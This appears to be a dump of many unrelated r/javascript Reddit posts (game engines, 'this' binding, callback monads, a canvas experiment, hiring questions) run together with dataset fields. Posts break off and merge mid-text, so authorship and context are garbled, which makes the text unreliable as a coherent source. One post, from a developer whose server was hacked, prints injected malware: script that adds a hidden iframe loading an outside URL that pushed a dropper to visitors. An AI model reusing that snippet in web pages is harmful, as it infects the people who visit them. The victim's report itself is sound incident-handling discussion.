I put together a [list of game engines available for JavaScript](https://gist.github.com/768272). It seems like there are heaps of those out there. And I'm sure I managed to miss some.

Since reddit is great and everything I thought it might be cool to try to make this a community effort. Having some sort of ready compiled list with a nice description of each engine would definitely help a lot.

If you don't have anything better to do and want to help fellow redditors interested in JS game dev out, feel free to fork the list and modify it as you like. :)

Just to save some clicking around, here's the whole list:

## 3D Engines

Compared to full-fledged game engines these might be missing some features (AI, sound, game logic, network etc.) and you might need to use some other libs to provide these features.

Quick [vine/video](https://vine.co/v/hq2WpJvbnDM) of the game if you are wondering is it worth reading.

Link to the game is at the bottom of post - because I mostly want to share my bitter-sweet joy after spending 500+ hours on this title.

**Technical details:**

* Done with canvas - supported by my unfortunately named library [Canvas Query](http://canvasquery.com) 
* No DOM/CSS rendering
* Sound based on Audio element (no WebAudio API)
* GamepadAPI - w3c/chrome specification

**Windows / Linux / Osx - [node-webkit](https://github.com/rogerwang/node-webkit)**

Very pleasant to work - absolutely nothing has to be tweaked. Managed to do both windows and linux packages under Ubuntu (using WINE). Unfortunately for Mac you need OSX. Also you need special build for OSX &lt; 10.7 - alsooooooo your app will not get accepted in Ubuntu Store for Ubuntu &gt; 12 because of some [dependencies craziness](https://github.com/rogerwang/node-webkit/wiki/The-solution-of-lacking-libudev.so.0)

**Android / IOS - [CocoonJS](http://www.ludei.com/tech/cocoonjs)**

Everything goes rather smooth if you are creating the game with cocoon in mind from the start - no DOM, first canvas element is screen, some traps like audio.load - pros is that it is WAY faster (thanks to OpenGL) than PhoneGap and other solutions - also you don't need OSX, nor developers account in development process. Cons are that you will loose your hair searching for bugs that are not in your code.

I have failed to make port for IOS because imageData related functions are not working properly - also it kill the app randomly for some reason - also context.arc is broken on IOS.

CocoonJS will support Gamepad API which makes it possible to make OUYA games. If you can't get your game working on IOS - [ejecta](http://impactjs.com/ejecta) is an alternative.

**Firefox OS**

Deploying application is the easiest of all platforms - you just upload some manifest file and voila - no porting at all. However the OS is still too slow to render more complex games like QbQbQb - tho I've been able to run [different one](https://vine.co/v/hKJEruQrPXD) in built-in browser (which performance is no-different from native apps) with promising results (but that's not the topic).

--

**Distribution**

Currently my game is available on Humble (bundle) Store and Google play store, Newgrounds, Kongregate. Pending approval for Desura. Rejected by GOG and Rovio stars. Will be trying greenlight. However this is marketing - I am failing hard in this field so won't play wise guy :)

*One advice*: do not put DEMO in title on Kongregate - even if it is true :) They like/ask to be cheated by disguising demo as a normal version - and then full game is called ""SUPER"" or ""HD"" despite it has all the same assets.

I will be trying to find time to reveal little by little details on publishing on different platforms - especially how to build packages for android, ubuntu or making windows installers because this is something that javascript programmer may find extremely repulsive (I DID... it breaks the whole idea of HTML5 portability with browser as a vessel - and I am not yet sure was it the best business decision).

Also to show you a glimpse of how many twists are there check my distribution/ folder structure http://pastebin.com/raw.php?i=Wkb8XciR

So I wanted to show you my approach in that field. I am also trying to unveil the beauty of prototypes instead of emulating classical inheritance.

It's still very much in development but I'm getting close to calling it beta and leaving it up. I need to tackle some potential bandwidth issues - which is what I'll be mostly monitoring now. Perhaps someone can chime in on web sockets and compression?

~~I'll be leaving it up for a couple of hours or until the server melts.~~
I have to bowl in league tonight - but I'm going to leave the server up. It's performing pretty well.

PS: I know the client code is a mess. It will be refactored - I promise. 

UPDATE: Thanks everyone for playing: It was great seeing the multiplier mechanics in action. And thanks for the suggestions, there have been some great ones. As I said above, I have to go for a while but I'm going to leave the server running for now. I do think there is a memory leak that causes some lag and will crash the server from time to time. But the server restarts - or should. 

UPDATE: Sorry for the trolls posing as me in game. Trust me, I do not want to cyber with you. :/

UPDATE: I'm going to leave the server up ~~overnight~~ since people are playing and having fun. ~~There is a memory leak, so I've schedule a task to **restart the service every hour** to avoid excessive lag - sorry about that~~.

If you google around you'll find tons of multi-page articles discussing `this` at extreme length. Many seem to do some crazy mental gymnastics to try and rationalize a contextual `this` with Javascript's `this`.

To understand `this`, you must first abandon any notion that this is in *any way* related to the function it's contained in. This is determined at *call time only*. Here's 4 rules to understand what the value of `this` will be depending on how the function is called:

* If your function is called on an object (foo.bar()), `this` is the object (foo).
* If your function is not called on an object (bar()), `this` is undefined in strict mode or the global object outside of strict mode. Event callbacks, setTimeout callbacks, and etc. fall under this category for the most part.
* If your function is called with new (new Bar()), `this` is a new object that will be returned by new Bar() once Bar returns (assuming it doesn't return another object).
* If you used call or apply, `this` is whatever you specified.

And with that you should be able to know what `this` will be in a function when you call it. The trick then becomes understanding how a function you author will be called so you can use `this` appropriately (or avoid it altogether).

**Some useful conventions around `this`:**

Function.prototype.bind in ES5 and various libraries allows you to bind a function to a certain `this` value, useful for the second category above. Bind can be fairly trivially implemented in ES3. Give this a try! (hint: use closure capture and apply)

     var bar = foo.bind(obj);
     bar(); // this will be obj inside foo.


Also handy is storing `this` in a variable. This allows nested functions to closure capture the variable and it will always be what you set it to be at the time the parent function was called.


     function Constructor() {
        var that = this;
        this.myFunc = function() {} // captures 'that', which is initialized to this (the instance)
     }

The story of www.wouldisurviveanuke.com  
""How to build a full scalable website using only javascript and Amazon S3""

Backstory:
A while back a co-worker and I were having a fun argument as to whether or not if a nuclear bomb dropped in the heart of Seattle we would survive at our work in the city of Tukwila. I thought it would be funny to go home that weekend and code out something to prove my co-worker wrong. (The funny part being that I would go so over the top to prove him wrong). Well I came back on that Monday and displayed what I had and we all got a good chuckle. About that time someone had the brilliant idea of âHey, why donât you post that to reddit and see what they say?â So I did just that. Here was my original post.

http://www.reddit.com/r/gaming/comments/m97qn/find_out_if_you_would_survive_a_direct_blast_from/

Well it turns out that someone at motherofjones.com saw it 

http://www.motherjones.com/mojo/2011/11/will-your-block-survive-nuclear-apocalypse

and posted it, which lead to Gizmodo posting it.

http://gizmodo.com/5859039/check-if-your-house-will-be-vaporized-in-a-nuclear-war

 From there it got wildly popular for a couple weeks before its 15 minutes was done.

PROBLEMS:
The first version of the website was built on Zend Framework using Postgres and PostGIS to do all the heavy lifting. It was a little overkill but it was an excuse to learn more PostGIS, which i had wanted to do. Since the site was just supposed to be a joke that i posted to the internet, i figured no one would visit it. I decided to host it on this old dell under my desk at home. During my sons birthday party someone had come up to me and said ""Dude, i think something is wrong with your computer, its making a lot of noise"". I did a quick htop to find both cores just railed at 100%. This is how i found out i had hit motherofjones.com. I had stuck a few ads on it hoping to make a few bucks. Now that it was getting some serious traffic I needed to keep it up otherwise i was losing money.

THE OK SOLUTION BUT NOT GREAT SOLUTION:
I panicked. The only thing going for me was that my database use was read only with static data. I spun up 4 Amazon Large instances, threw them under the load balancer and rode out the site's 15 minutes of fame. The second problem came about when the site's popularity fell. The ads didnt bring in enough money to justify anything but an Amazon micro instance. This was fine for day to day traffic, but i would get random spikes (say from a Polish news site or some random forums) which would have me constantly having to babysit the site. I would find myself turning on and off large instances to meet the temporary demand. This became a pain in the butt.

THE BEST SOLUTION:
I really had two options. I could spend the time to automate Amazon to automatically meet the demand by turning on and off larger instances or I could just move all the logic to client side and call it a day. I chose the second approach. There was really no need to have a web server. I was not doing any complicated geo positional coding that i couldn't just move from PostGIS to Javascript. I rewrote the whole site but this time focusing on moving all logic and heavy lifting to the client. I pointed my DNS to Amazon S3 and have never worried about scaling again. The only limitations I face is Amazon's ability in S3 to distribute my files, which is to say I will never have to worry about it. The second benefiet is that my out of pocket cost to keep the website up is next to nothing. Besides the $10 a year I pay to namecheap.com, my bill from Amazon was $.06 last month.

NOTES ABOUT THE CODE:
1. I tried to build it as a modular application. I wanted to be able to switch out maps (say switch from google to bing or open street maps). I never got around to writing my bing class, but it should be doable.
2. If you are curious as to how to compare what the logic was before, here ya go
https://s3.amazonaws.com/www.wouldisurviveanuke.com/nuke.sql
3. Yes, I know there are better sites out there like nuclearsecracy. Again, it was built as a joke originally :)"	t5_2qh30	True

Most of us have read 'Javascript: The Good Parts' and have years of experience writing javascript. The problem is, we've been writing it second-class, and we haven't accumulated the expertise I feel is necessary to write a decent FE component.


I know that's all rather vague, but I hope it gets at the what I'm trying to ascertain. If not, here are some specific questions:

* What practices are critical to writing better javascript?
* At this point in our education, would adopting a framework like backbone.js facilitate or inhibit our growth?
* How have you succeeded in legitimizing javascript at work? How have you failed?

I came close to throwing another library at the solution (backbone.js) but I'm hesitating because I don't know that more libraries will really help things. And on the one hand maybe it's not TOO messy, I mean, I can certainly keep adding features and won't have trouble figuring out how to get them working.

Every hour or so JS code was being added to each file that contained &lt;/body&gt; tag(just before it). The script was adding hidden iFrame, which made visitors download a dropper.

I changed the password(to much more secure), backed up yesterdays version of the website and removed application I was developing on the server, assuming it might have some hole in it.

We are still trying to figure out how they got in.

Thx a lot for all the comments and help. I wouldn't be able to google all of it.

I recently started to do some work in php. Today I discovered that lots of files in the system I am developing contain following code in the end(just before &lt;/body&gt; tag.

I did not add this script.

Has the server I am working on been hacked or sth? Should I alert my employee?

Code:

Edit 1 what the code actually looks like: 

    if (document.getElementsByTagName('body')[0]) {
        iframer();
    } else {
        document.write(""&lt;iframe src='http://tlunwpz.ce.ms/count13.php' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;"");
    }
    function iframer() {
        var f = document.createElement('iframe');
        f.setAttribute('src', 'http://tlunwpz.ce.ms/count13.php');
        f.style.visibility = 'hidden';
        f.style.position = 'absolute';
        f.style.left = '0';
        f.style.top = '0';
        f.setAttribute('width', '10');
        f.setAttribute('height', '10');
        document.getElementsByTagName('body')[0].appendChild(f);
    }

**Update** I found another code - it is a whole js file pretending to be font file. and much more complex i think... couldnt even post it here, because it was too long so: 

https://docs.google.com/demo/edit?id=scABiIG6zQvv0bpsi2lDSx8vn&amp;hl=pl&amp;dt=document#document

update: people say it is a harmless font file.

-------

**Update 2**

- after 4 hours the admin finally changed the password.
- the iframe script was added before &lt;/body&gt; 4 times.
- the cufon file was uploaded to server 4 times(each time with different content) - the one in google docs is the longest one. although people claim the file is ok, I see no reason why whoever gained access to our server would upload legitimate font file... if requested I can upload all 4 files.

So far I've only got one method (it's taken from some blog)

    var SafeConstructor = function(realCtor){
        ""use strict"";

        return function wrapperCtor(){
            var obj;
            if (this instanceof wrapperCtor) {
                obj = this;
            } else {
                surrogateCtor.prototype = wrapperCtor.prototype;
                obj = new surrogateCtor();
            }
            realCtor.apply(obj, arguments);
            return obj;
        };
    
        function surrogateCtor() {}
    };

With this declared you can create constructors like this

    var Point = SafeConstructor (function(x,y){
        ""use strict"";
        this.x = x;
        this.y = y;
    });

And create as usual with new...

    var pt = new Point(20,30);

But if you forget new it works too...! Which I probably will at some point. So this is great.

    var pt2 = Point(20,30);

And I know about ""you should use uppercase for constructors"" so save it."	t5_2qh30	True

You can then use the pixel coordinates to do your own rendering. 

This is a little tool I made for myself once. I'd thought I'd share it so I made some examples and a github page. 

Here's an example how you'd use it, based on the good old c64 font:

        pxxl(""fonts/c64d.bdf"", ""Pxxl.js"", function (pixels) {
          var ctx = $('canvas')[0].getContext('2d');

          for (var p=0,hue=0 ; p&lt;pixels.length ; p++,hue++) {
            var pixel = pixels[p],
              x = pixel.x*6,
              y = pixel.y*6;

            ctx.fillStyle = ""hsl(""+ hue +"",100%,50%)"";
            ctx.fillRect(x,y,5,5);
          }
        });

Which results in [this](https://a248.e.akamai.net/camo.github.com/8c6f80477a292e697b875c0307dcde839f055883/687474703a2f2f72656d636f6465722e6769746875622e696f2f5078786c2e6a732f696d672f7078786c2e706e67).

I reluctantly posted a redditrequest to be added.  I say reluctant because of who it is sitting in the sidebar there... John freakin' Resig... it's kind of weird to be asking to usurp anything of his even if it's a little corner of Reddit.

However, he'd been unresponsive, so a month later my request was granted by the reddit admins.  They've also added CyberVillian...

I don't intend to do *much* in terms of moderation - but my main gripe was that Reddit's spam filter is overzealous to a point of insanity, so I've posted a few things that never saw the light of day here despite not being the least bit spammy.

I think reddit self-moderates pretty well, so my only intent (I haven't talked at any length with CyberVillian just yet) is:

1) Respond to requests for rescuing posts from the spam filter

2) Remove actual spam

3) If and only if it ever becomes a problem, I'd consider removing things entirely offtopic/inappropriate (it really hasn't been a problem here, but if someone posts, say, a Ruby article here I'll probably politely suggest they post it somewhere more relevant)

Besides that, I think the voting system works pretty well, and I think that this community as it stands is actually really awesome.  You'll probably barely notice we're here short of maybe a logo update and some more useful/relevant sidebar content - and that's the way it really should be imho until there's a ""problem""..."	t5_2qh30	True

Im really struggling with the code academy exercises and am beginning to ask myself 'do i really need to learn vanilla javascript if everyones using libraries anyway?'. What possible use could vanilla have these days?

Also, should i be doing more than just doing the exercises on code academy? i.e read books on jscript/work on some sort of basic project?

Thanks

Edit : Why downvote? I've been doing front end coding for 2 months now so i really dont know that much. Help a guy out!

Edit 2 : Some great posts here guys. Thanks for you input. In hindsight I maybe should have stated my aspirations ; I dont desire to be a programmer. I don't find writing code for the sake of it fun, HOWEVER, I do get inspired by browsing www.thebestdesigns.com and seeing beautiful websites with such interactivity and fluidity. I want to be able to make visually stunning websites as opposed to soley being a 'programmer' in the traditional sense if you understand. Thanks again.

All it does is create an infinite loop and crashes the page. (I didn't even know that was valid syntax ). I wondered what it was there for, and thought it was maybe a way of preventing XSRF that utilizes &lt;script&gt; tags. But the data isn't even loaded with a function call (JSONP).

I recently recommended to someone, asking where they can start learning javascript, W3Schools.  I was, as if by knee jerk reaction, reprimanded and pointed to W3Fools.  Frankly, I found the site to be childish, sensationalist, out of date, and in general it seems to flog W3Schools for not being a 300 level course on the subject.  I see 'learn' and 'tutorials' all over the place when I visit the site which to me says it's more of a 'Web Technologies 101' kind of website.  Although they do have that banner that says, ""Educate yourself - beginners and experts"".  I would never recommend this site as an in-depth resource on the technologies it teaches.  On the other hand, for a beginner on these topics, I don't think it's a bad resource to learn from either.

#Inaccuracies
W3Fools accuses W3Schools for publishing inaccurate and misleading content yet I can't help but feel like the pot's calling the kettle black.  W3C has asked W3Schools to disavow their association explicitly and yet, I can't find any source on this.  Even the [Wikipedia page](http://en.wikipedia.org/wiki/W3Schools) is asking for citation.  They question the value of the certificates offered but doesn't everyone question the value of any certificate offered at most places?  It's based on reputation, and so I understand what they're getting at here, these certs are poorly viewed because W3Schools is basically a tutorial site.  It would be like me putting my kindergarten diplomas and certificate of accomplishments on my resume.
***
#Out of Date
&gt; Today, they do not even allow you to submit corrections on a page. They should.

They do.  It's at the bottom of the site.  There's a link that says ""Report Error"" which just opens up a form dialog to report an error.
***
#Ultamatom
&gt; We believe it is W3Schools's responsibility to disseminate accurate informationâand if they refuse, we hope that this document will help dissuade others from promoting or linking to W3Schools as an authoritative source of information.

If they refuse, we hope?  That's not how ultimatums work.  This just feels childish to me.
***
#Respect My Authority
&gt; Although we haven't heard from W3Schools directly, we have noticed that W3Schools has started to correct errors we've spotted. These have been noted here with ~~strikethrough~~. Although we'd appreciate some communication, we're elated they've taken steps to improve their information.

I don't understand why those who created this site feel as if they deserve some feedback from W3Schools, especially after creating this site.
***
#Javascript ""Errors""
I'm not going to go through all of these as some just seem like they're criticizing a 101 level course for not teaching 300 level material.  More on this later.

* http://w3fools.com/#js_timing - Not so much bad advice as a bad syntax example.  *""Javascript Function""* is saying a function goes here, not a string.  From W3Schools, ""The first parameter of setInterval() should be a function.""  And in their examples, they never pass in a string.
* http://w3fools.com/#jsref_eval - What?  In Firebug console, `eval(1 + 1)` and `eval(""1 + 1"")` both return 2.  According to W3Fools, ""In fact, if you do not pass a string to eval(), the argument is returned unchanged.""  Even in the W3Schools example code, they have `eval(x+17)`.  I won't argue with why you shouldn't use eval, but it's a part of javascript and so W3Schools includes it.  Note that eval isn't in their tutorials for beginners, it's in their documentation.
* http://w3fools.com/#js_statements - ""Apparently declarations and expressions can go right to hell (since JavaScript only is a sequence of statements)"" Statement(http://en.wikipedia.org/wiki/Statement_(computer_science) ): ""A statement will have internal components (e.g., expressions)."" I don't understand their comment here.
* I'll just stop here...

***
I feel like I could go through a lot more of these and point out things that are out of date, childish (""lol, whut?""), sensationalist, misdirected/misunderstood, etc...  It feels like it was written by a tween for a tween.  W3Fools exists because W3Schools doesn't warn you of the pitfalls of javascript.  Neither does Codecademy though.  Great tutorials but they don't go into the pitfalls of the language either.  MDN is a fantastic resource, but more from the perspective of, hey, you're really getting the hang of javascript,  let me help you with things to avoid and provide you with a more indepth understanding so you can start writing some really complex functionality for your website.

W3Schools is not perfect and when it is seen posted as a reference, a good response would be, ""W3Schools teaches the basics of javascript but their documentation doesn't warn you about the pitfalls of the language, when you get to that point, here are some good resources...."", and not, ""You idiot, look on the right over there at the W3Fools link, snark snark.""  The latter feels like a [monkey pulling other monkies off the ladder](http://i.snag.gy/kdu77.jpg) because that's what others did to them and that's all they know.

Back to the title I guess.  Is W3Fools really a useful resource?"	t5_2qh30	True

[Here's the link to the experiment.](https://dl.dropbox.com/u/38345845/Experiments/BezierCurves/page.html) It's from my Dropbox, I just hope it doesn't exceed its limit.

So I thought, maybe I could get some feedback (I'd like to have more concept for patterns of lines, for example), maybe you guys would enjoy the experiment or maybe it could be useful for those who wants to learn how canvas work.

I'm not really new to javascript, but I admit that I learned it mostly by examples so I just hope my code is organized or at least can be interpreted by anyone interested in learning with it. Also, don't worry about the bÃ©zier calculation algorithm if you ever check my code, I'll re-write it and put in a function.

First, curse the cross-eyeing part, it'll not work well with my set up no matter what...

Second, I'll have a separate experiment in which I'll show how everything works and how the bÃ©zier curve is calculated, this experiment is just showing what bÃ©zier curves can do.

And finally, this experiment adapts itself to any screen size! F11 makes the experience much better! sadly re-sizing cleans the canvas, but that's just a small issue...

Any feedback, ideas or critiques, will be appreciated. Thanks for your time!"	t5_2qh30	True

Srirangan	68	13	29	"In my [previous thread](http://www.reddit.com/r/javascript/comments/m0a4m/notifierjs_elegant_javascript_notifications/) I shared [Notifier.js](http://opensource.srirangan.net/notifier.js/) and received great feedback from the Reddit JS community. Based on which, enhancements have been made to the tool. Here's a list:

* Position the notifications anywhere you like (top, right, bottom, left) by changing the default configuration. The default is still top right similar to Gnome, Growl etc.
* Change the default timeout by changing the default configuration. Default = 5000 ms.
* Configuration lets you specify your own custom styles
* Single .js file include - No more external images and .css files. Just a simple, single line .js file include.
* Using jQuery delays instead of setTimeout to fadeOut
* Leveraging jQuery to reduce the already small footprint
* Stricter adherence to standards / best practices

A big thank you to k3n, kmillns, nicogranelli, ctrldavid, tortus, joseph177, honestbleeps, ContraContra and everyone else who contributed on Reddit discussion.

Of course, credit to GutHub collaborators Hello71 and Atinux for their contributions as well.

Thanks for all your support. And while Notifier.js is not a primary project on which I'll be working week in and week out (its just a tool to be used in other project), I do appreciate the need to make a robust, maintainable yet simple and minimalist notifications library.

Looking forward to your ideas, forks and pull requests in the future as well.

I am not a node.js developer, I doubt I ever will be a node.js developer.  I appreciate the project, I understand why it is significant and I am glad it exists and is being worked on, but I have absolutely no interest in the project.  I subscribe to this subreddit because I am interested in client side JS and what people are doing with JS in the browser, and it's really annoying to click on a link that sounds really awesome only to find out it's yet another Node project.

I imagine that if I feel this way, there surely must be others that feel the same; so on behalf of all of us, could you please tag Node.js related posts with [Node] in the title?"	t5_2qh30	True

1371724621.0	1gpx8k	Hi /r/javascript. Yesterday I posted my Google Maps API experiment (a map with only roads). It's been loved so much, that it ended up being crashed. To return the love, here's how I made the map	SavTheCoder	69	14	14	"[Original post](http://www.reddit.com/r/javascript/comments/1gneaf/so_i_was_experimenting_with_google_maps/)

Hi /r/javascript. Here's the Javascript code to the map with nothing but roads:

	function initialize() 
	{

		/*
		* 1. SET INITIAL OPTIONS FOR THE MAP:
		*/
		var mapOptions = 
		{
			// set the map centered at 51.5171, -0.1062 (not very important)
			center: new google.maps.LatLng(51.5171, -0.1062),

			// set the map zoom at level 7 (so that the roads start to show up)
			zoom: 7,
			
			// get rid of all the default UI elements
			disableDefaultUI: true,

			// set the map as a road map
			mapTypeId: google.maps.MapTypeId.ROADMAP
		};

		/*
		* 2. DISPLAY THE MAP IN A DIV WITH ID ""map-canvas""
		*/
		var aMap = new google.maps.Map(document.getElementById(""map-canvas""), mapOptions);

		/*
		* 3. STYLE THE MAP TO DISPLAY NOTHING BUT ROADS
		*/
		var mapStyle = 
		[
			// remove all the features from the map (set visibility:off)
			{
				featureType: ""everything"",
				stylers:
				[
					{visibility: ""off""}
				]
			},

			// make roads visible, set them to red
			{
				featureType: ""road"",
				stylers:
				[
					{hue: ""#000000""},
					{lightness: -20},
					{visibility: ""on""}
				]
			},

			// get rid of road names (for a cleaner map)
			{
				featureType: ""road"",
				elementType: ""labels"",
				stylers:
				[
					{visibility: ""off""}
				]
			}	
		];

		// set the styling to our map
		aMap.setOptions({styles: mapStyle});

	}

	/*
	* 4. INITIALIZE THE MAP
	*/
	google.maps.event.addDomListener(window, 'load', initialize);

I hope that it isn't riddled with too many errors and that some people find it informative. If you're interested, read on.

Javascript code often has a lot of asynchronous functions that look similar to this:

	function getFoo( url, onComplete, onFail ) {
		... ajax stuff ...
	}

	function getBar( url, onComplete, onFail ) {
		... ajax stuff ...
	}

And there is often a need to chain those functions together:

	function doSomething( url, onComplete, onFail ) {
		getFoo( url, function ( foo ) {
			getBar( foo, function ( bar ) {
				getBaz( bar, function( baz ) {
					getSna( baz, onComplete, onFail )
				}, onFail )
			}, onFail )
		}, onFail )
	}

That probably looks familiar to anyone who has written any ajax heavy javascript. It's ugly though. Wouldn't it be nice if that looked a bit more like:

	function doSomething( url, onComplete, onFail ) {
		var foo = getFoo( url )
		var bar = getBar( foo )
		var baz = getBaz( bar )
		var sna = getSna( baz )
	}

Fortunately the magic of monads allows us to do just that! Let's start by (partially) currying those ajax functions:

	function getFoo( url ) {
		return function ( onComplete, onFail ) {
			... ajax stuff ...
		}
	}

Why? Well, for now just trust me. With that change doSomething would look like this:

	function doSomething( url, onComplete, onFail )
	{
		getFoo ( url )( function (foo) {
			getBar ( foo )( function (bar) {
				getBaz ( bar ), function (baz) {
					getSna ( baz )( onComplete, onFail )
				}, onFail )
			}, onFail )
		}, onFail )
	}

Doesn't look a whole lot different. However, we can now break it up into separate steps like so:

	function doSomething( url, onComplete, onFail ) {

		var fooM = getFoo( url )

		var barM = function ( onComplete, onFail ) {
			fooM( function( foo ) { getBar ( foo )( onComplete, onFail ) }, onFail )
		}

		var bazM = function ( onComplete, onFail ) {
			barM( function( bar ) { getBaz ( bar )( onComplete, onFail ) }, onFail )
		}
		
		var snaM = function ( onComplete, onFail ) {
			bazM( function( baz ) { getSna ( baz )( onComplete, onFail ) }, onFail )
		}
		
		snaM( onComplete, onFail )
	}

Well, that looks like it's a step in the right direction. In fact, those assignments are all similar enough to each other that we can create a helper function to reduce the boilerplate:

	function bind( M, f ) {
		return function ( onComplete, onFail ) {
			M ( function( result ) {
				f ( result ) ( onComplete, onFail )
			}, onFail )
		}
	}

	function doSomething( url, onComplete, onFail ) {
		var fooM = getFoo( url )
		var barM = bind( fooM, getBar )
		var bazM = bind( barM, getBaz )
		var snaM = bind( bazM, getSna )
		snaM( onComplete, onFail )
	}

This is looking a lot better. In fact that is essentially the result that we set out to find. I want to go a few more steps though. You might notice that these steps are now very similar to a 'reduce' operation. The getFoo invocation doesn't fit the pattern though. We can fix that with another helper function:

	function unit( arguments ) {
		return function ( onComplete, onFail ) {
			onComplete( arguments )
		}
	}

	function doSomething( url, onComplete, onFail ) {
		var fooM = bind( unit( url ), getFoo )
		var barM = bind( fooM, getBar )
		var bazM = bind( barM, getBaz )
		var snaM = bind( bazM, getSna )
		snaM( onComplete, onFail )
	}

And now we can re-write as a single reduce (foldl) operation:

	function doSomething( url, onComplete, onFail ) {
		[
			getFoo, 
			getBar, 
			getBaz, 
			getSna
		].reduce( bind, unit( url ) ) ( onComplete, onFail )
	}

And there we have it! Isn't that nice and clean? A little bit of syntactic sugar from the compiler could go even further in improving the readability.

So what in all this is the monad itself? A combination of these three things defines ""the monad"":

* The bind function
* The unit function
* The 'function (onComplete, onFail) {...}' signature. This is the 'type constructor' for the monad. The objects that we've named ending with 'M' (fooM, barM, etc) are all of this type.

Extra credit: Why did I name that second helper function 'unit'? Because you can insert it anywhere in the sequence without changing the result:

	function doSomething( url, onComplete, onFail ) {
		[
			getFoo, 
			getBar, 
			unit,
			getBaz,
			unit, 
			getSna
		].reduce( bind, unit( url ) ) ( onComplete, onFail )
	}

Those extra 'unit' instances have no affect on the result. Just like the value of 4 * 5 * 6 * 7 isn't changed by adding a few ones (4 * 5 * 1 * 6 * 1 * 7) because one is the unity value for the multiplication operation, just as our 'unit' function is the unity value for the operation defined by this monad.

So that is a quick hands-on introduction to monads. If you can understand this code then you can ""get"" monads. In a functional language they solve the ""problem"" of mutable state because, to go back to our example, no state is modified until the function returned by the reduce statement is actually invoked, something that we've done explicitly here but in a language like Haskell the compiler can do behind the scenes without ""corrupting"" the pure functional nature of the code. 

I hope this helps anyone who was interested in understanding monads but had trouble with the other explanations out there. Let me know in the comments what you think. Cheers!

Recently I decided I wanted to learn another language, and I figured I'd go with C#. This is proving to be a relatively easy task, I found out, being as that most modern languages (particularly OO languages) are quite similar - you learn the syntax, the various classes and their methods, and you're good to go! Well, not really, but still. 

My question however is this: is JavaScript the future? Today, I see JS everywhere. Back in my day, it was the annoying thing that slowed down other browsers, but it is very much relevant in today's applications, and I'm talking desktop applications as well. AFAIK, Windows 8 uses JS to power its new start menu. Chrome OS loves JS. You can write anything in JS. I've also decided to learn QtQuick (QML), which also seems to be JavaScript-based.

The plugin allows you to add a the debugger keyword at the line specified, which isn't that useful in itself, but it tracks those breakpoints for you, allowing enabling, disabling, and even conditional breakpoints. The benefit is that you don't have to modify all your breakpoints in chrome dev tools when you add or remove lines from your source js. The downside is that you can't disable breakpoints at run time :(  

I know that some of the code is fragile, so please find the ways that the code can be broken and let me know! I am sure there are a number of rookie mistakes in there. Also, recommendations for features would be nice too (within the restrictions of what the plugin is currently doing of course).

This is my first python project, first plugin, and first github project, so advice on any of those fronts is greatly appreciated. Once I feel more confident with the plugin, I will see about having it added to sublime package control."	t5_2qh30	True

I've always used *return false* at the start or middle of a function, as a simple check for invalid data that would produce an error if the function carried on.

My boss (with many years of varied programming experience) explained that it is best practice to have a *single* return statement near the bottom of a function. He says that it reduces the chances of errors and keeps things manageable. 

To me this seems like an invitation for unnecessary variables and complex nesting of if statements, there's a good example in [number 15 of this tutorial](http://net.tutsplus.com/tutorials/html-css-techniques/top-15-best-practices-for-writing-super-readable-code/).

Why create a prototype'd method of an object if you can just include the method in the object itself?

So in this example:
            
    	function Player(name, hitpoints) {
    		this.name = name;
    		this.hitpoints = hitpoints;
    	}
    
    	var p1 = new Player(""Dan"", 50);
    	var p2 = new Player(""Bob"", 100);
    
    	Player.prototype.attack = function(opponent) {
    		opponent.hitpoints -= 10;
    		alert(opponent.name + "" has "" + opponent.hitpoints + "" hitpoints left"");
    	}
    
    	p1.attack(p2);

How is creating *Player.prototype.attack* any better than simply doing this?:

	function Player(name, hitpoints) {
		this.name = name;
		this.hitpoints = hitpoints;
		this.attack = function attack(opponent) {
			opponent.hitpoints -= 10;
			alert(opponent.name + "" has "" + opponent.hitpoints + "" hitpoints left"");
		}
	}

	var p1 = new Player(""Dan"", 50);
	var p2 = new Player(""Bob"", 100);

	p1.attack(p2);

If there's no benefit to creating the prototype in this example, can you please explain a situation in which creating a prototype is helpful?

 * Sprite animation via a Cycle object (gif-like via javascript)
 * Game loop handling
 * Basic physic
 * Input handling (mainly keyboard)

The framework is focused on performances and providing a simple low level API for animations and games.  This version brings stability in the API.

**Click, hold and drag to start!**

Only tested with Chrome. ~~Doesn't work with firefox~~ Reported working with Firefox and Opera (enter numbers in the position X &amp; Y boxes), doesn't work with a few android browsers i tried, ~~doesn't~~ works with IE10. Might work with Safari, i dunno.

So this is pretty much the first program I've ever coded with js. The code is a mess and the app has no purpose, other than being a personal learning experiment. A few questions have arisen during the making..:

1. Chrome and upscaled, *sharp* canvas pixels (nearest neighbor interpolation). Possible? Or do I have to make a webgl framgment shader?

2. I didn't plan much when writing the code. Pretty much the only things I drew on paper were the trigonometric functions and line division. The rest was mostly trial&amp;error. I think this is why my code is spaghetti. Any tips to avoid this in the future? How should I plan program flow/data flow if my app isn't completely thought out before starting or if I'm just experimenting with things and see where that takes me?

3. The third question is only here to have things nice and divisible by three. My OCD sends its regards!"	t5_2qh30	True

I'll preface this question by telling you I'm very, very new to Javascript, so forgive me if I'm not clear or if I don't understand something you might say.

I've started taking this Tuts+ courses online to teach myself about web development, and am currently going through the javascript material.  I was going through the lesson about functions last night and started to get confused with anonymous functions.

Can someone explain what they're for in a way that a noob would understand?  Also, what's the difference between these two things? 

// Function One


function doSomething() {
...
}


//Function Two


var doSomething = function(){
...
};


//both calling

What did I do wrong?

Is it because of the initial overhead to setup and integrate Closure in to your build? Is the actual js library too verbose/foreign (relative to other js frameworks)? Did the ""bad press"" it [received](http://www.sitepoint.com/google-closure-how-not-to-write-javascript/) right after launch (re: inefficient techniques and bad practices) leave a bad taste in the mouths of developers? Is Closure more geared towards web-apps than websites (where, obviously, websites are more prevalent)? Or is everyone really just that satisfied with jQuery[*](http://w3techs.com/technologies/overview/javascript_library/all)?

For the record, when I say Closure I mean the whole suite of tools: the [compiler](http://code.google.com/closure/compiler/), [js library](http://code.google.com/closure/library/), [templating system](http://code.google.com/closure/templates/), and [linter](http://code.google.com/closure/utilities/)/[inspector](http://code.google.com/closure/compiler/docs/inspector.html).


**Updated/additional question:**

If you were tasked with reimplementing all of the javascript for a site like Amazon, would Google Closure be an acceptable solution (or at least a contender)?

1369955930.0	1fdbbd	How Do We Hire JavaScript People?	L4JSDev	47	15	72	"Hi /r/javascript

We're trying to hire a JS dev and really struggling to get the right kind of candidates.

Let me set a scene to try and explain the kind of role we're trying to fill.

We're a consultancy whose main technology focus is SharePoint (2010 and 2013) and Project Server

